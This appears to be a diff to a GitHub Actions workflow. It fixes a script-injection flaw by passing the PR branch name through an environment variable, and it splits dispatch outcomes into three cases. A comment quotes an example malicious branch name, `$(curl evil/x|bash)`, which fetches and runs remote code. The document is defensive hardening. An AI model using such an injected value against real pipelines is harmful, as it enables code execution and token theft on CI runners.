@@ -1154,6 +1154,19 @@ jobs:
         env:
           GH_TOKEN: ${{ github.token }}
           PR_NUMBER: ${{ github.event.pull_request.number }}
+          # Passed via env, not interpolated directly into the run: script
+          # below, deliberately -- github.event.pull_request.head.ref is a
+          # PR author-controlled branch name, and GitHub substitutes `${{
+          # }}` expressions as literal text BEFORE the shell parses the
+          # script. A branch named e.g. `$(curl evil/x|bash)` would, if
+          # interpolated directly, become real shell command substitution
+          # in the runner's context -- a live AI review round on this
+          # exact PR caught this (this repo's own official GitHub Actions
+          # script-injection example). Referencing it as "$HEAD_REF"
+          # instead means its contents go through ordinary parameter
+          # expansion, never re-parsed as shell syntax, regardless of what
+          # characters it contains.
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
           set +e
           force_jobs=$(node scripts/parse-force-run-jobs.mjs /tmp/review.md)
@@ -1168,23 +1181,27 @@ jobs:
             # pointing at the Actions tab and making the reader hunt for
             # the right run. Verified this is really stdout, not stderr,
             # by running it for real with the streams split.
-            #
-            # stdout/exit code kept separate from the old unconditional
-            # comment: the previous version claimed "a workflow run has
-            # been triggered" even when the dispatch itself failed (set +e
-            # meant a failed `gh workflow run` fell straight through to
-            # that same claim) -- now a genuine dispatch failure gets an
-            # honest comment instead, with the equivalent manual command
-            # to run by hand.
-            run_url=$(gh workflow run ci.yml --ref "${{ github.event.pull_request.head.ref }}" -f force_jobs="$force_jobs" 2>/tmp/force-run-error.txt)
+            run_url=$(gh workflow run ci.yml --ref "$HEAD_REF" -f force_jobs="$force_jobs" 2>/tmp/force-run-error.txt)
             dispatch_exit=$?
 
-            if [ $dispatch_exit -eq 0 ] && [ -n "$run_url" ]; then
-              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. Triggered run: $run_url — runs independently of this PR's normal required checks, since GitHub Actions can't retroactively un-skip a job in the run already in progress."
-            else
+            # Three distinct outcomes, not two -- a live review round
+            # caught that collapsing "exit 0, empty URL" into the same
+            # branch as a genuine dispatch failure is itself wrong: `gh`'s
+            # own docs say the URL is returned "if available", meaning a
+            # real success with no URL is an expected, non-error case. The
+            # first version of this fix treated that case as a failure and
+            # told the reader to manually re-dispatch -- which, since the
+            # original dispatch actually succeeded, would create a real
+            # duplicate run instead of just being unhelpful.
+            if [ $dispatch_exit -ne 0 ]; then
               dispatch_error=$(cat /tmp/force-run-error.txt)
               echo "gh workflow run failed (exit $dispatch_exit): $dispatch_error"
-              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`, but triggering it failed (a dispatch error, not a job failure -- see this job's own log for details). Trigger it by hand if still wanted: \`gh workflow run ci.yml --ref ${{ github.event.pull_request.head.ref }} -f force_jobs=$force_jobs\`."
+              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`, but triggering it failed (a dispatch error, not a job failure -- see this job's own log for details). Trigger it by hand if still wanted: \`gh workflow run ci.yml --ref $HEAD_REF -f force_jobs=$force_jobs\`."
+            elif [ -n "$run_url" ]; then
+              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. Triggered run: $run_url — runs independently of this PR's normal required checks, since GitHub Actions can't retroactively un-skip a job in the run already in progress."
+            else
+              echo "gh workflow run succeeded but returned no URL — dispatch itself worked, just nothing to link"
+              gh pr comment "$PR_NUMBER" --body "🔁 The AI reviewer disagreed with the CI skip logic for this diff and requested a force-run of: \`$force_jobs\`. A run was triggered successfully, but its URL wasn't available right away — check the Actions tab on the \`$HEAD_REF\` branch for its progress."
             fi
           else
             echo "Reviewer agrees with all skip decisions — nothing to force-run."
